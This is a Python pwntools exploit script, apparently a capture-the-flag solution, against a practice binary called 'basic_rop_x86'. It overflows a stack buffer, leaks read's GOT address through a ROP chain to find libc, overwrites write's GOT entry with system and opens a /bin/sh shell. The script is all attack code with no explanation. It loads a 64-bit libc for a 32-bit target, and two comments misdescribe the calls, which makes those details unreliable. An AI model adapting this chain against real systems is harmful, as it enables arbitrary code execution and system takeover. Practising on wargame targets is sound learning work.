```python
from pwn import *

p=process('./basic_rop_x86')
e=ELF('./basic_rop_x86')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level='DEBUG'

read_got=e.got['read']
write_got=e.got['write']
read_plt=e.plt['read']
write_plt=e.plt['write']
read_offset=libc.symbols['read']
write_offset=libc.symbols['write']
system_offset=libc.symbols["system"]

pop3gdgt=0x08048689
bss = e.bss()

buf_size=0x44
sfp_size=0x4

payload=b''
payload+=b'a'*(buf_size+sfp_size)

# write(1,read_got,4)
payload += p32(write_plt)
payload += p32(pop3gdgt)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# read(0, bss, 8)
payload += p32(read_plt)
payload += p32(pop3gdgt)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

# read(0,read_got,4)
payload += p32(read_plt)
payload += p32(pop3gdgt)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

# read("/bin/sh")
payload += p32(write_plt)
payload += b"a"
payload += p32(bss)

p.send(payload)

p.recvuntil(b'a' * 64)
read = u32(p.recvn(4))
lb = read - read_offset
system = lb + system_offset

p.send(b'/bin/sh\x00')
p.sendline(p32(system))
p.interactive()
```